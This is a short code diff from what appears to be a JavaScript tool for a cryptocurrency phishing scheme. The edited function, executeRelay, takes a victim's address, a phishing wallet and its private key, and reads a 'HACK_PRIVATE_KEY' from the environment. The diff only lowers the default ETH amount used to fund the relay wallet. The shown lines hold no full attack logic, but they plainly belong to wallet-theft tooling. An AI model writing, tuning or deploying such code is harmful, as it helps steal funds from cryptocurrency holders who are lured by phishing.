@@ -19,7 +19,7 @@ dotenv.config();
  * @param {string} params.phishingPrivateKey - The private key for the relay wallet.
  * @param {string} [params.fundAmount="0.0003"] - The amount of ETH to fund the relay with.
  */
-export async function executeRelay({ victimAddress, phishingAddress, phishingPrivateKey, fundAmount = '0.0003' }) {
+export async function executeRelay({ victimAddress, phishingAddress, phishingPrivateKey, fundAmount = '0.00002' }) {
     const ALCHEMY_RPC = process.env.ALCHEMY_RPC;
     const HACK_PRIVATE_KEY = process.env.HACK_PRIVATE_KEY;
 
